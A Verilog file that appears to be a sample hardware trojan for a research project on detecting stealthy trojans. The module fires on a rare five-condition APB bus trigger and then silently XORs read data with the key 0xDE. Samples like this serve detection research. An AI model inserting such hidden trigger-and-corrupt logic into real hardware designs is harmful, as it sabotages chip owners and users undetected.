// =============================================================================
// Module  : stealth_trojan
// Project : AI-Assisted Stealth Hardware Trojan Detection
// Purpose : Variant A - Classic 5-condition AND trigger with XOR 0xDE payload
// =============================================================================

module stealth_trojan (
    input  wire        PCLK,
    input  wire        PRESETn,
    input  wire [7:0]  PADDR,
    input  wire [7:0]  PWDATA,
    input  wire        PWRITE,
    input  wire        PENABLE,
    input  wire [8:0]  cycle_count,
    input  wire [7:0]  normal_prdata,
    output reg  [7:0]  trojan_prdata,
    output reg         trojan_active
);

    localparam [7:0] SECRET_KEY = 8'hDE;
    reg [7:0] prev_addr;

    always @(posedge PCLK) begin
        if (!PRESETn)
            prev_addr <= 8'h00;
        else if (PENABLE)
            prev_addr <= PADDR;
    end

    wire trigger_fire = (PADDR     == 8'hAA)   &&
                        (PWDATA    == 8'h55)   &&
                        (PWRITE    == 1'b1)    &&
                        (prev_addr == 8'h10)   &&
                        (cycle_count > 9'd200) &&
                        (PENABLE   == 1'b1);

    reg trojan_armed;

    always @(posedge PCLK) begin
        if (!PRESETn) begin
            trojan_armed  <= 1'b0;
            trojan_active <= 1'b0;
        end else begin
            if (trigger_fire) begin
                trojan_armed  <= 1'b1;
                trojan_active <= 1'b0;
            end else if (trojan_armed && PENABLE && !PWRITE) begin
                trojan_active <= 1'b1;
                trojan_armed  <= 1'b0;
            end else begin
                trojan_active <= 1'b0;
            end
        end
    end

    always @(*) begin
        if (trojan_active)
            trojan_prdata = normal_prdata ^ SECRET_KEY;
        else
            trojan_prdata = normal_prdata;
    end

endmodule
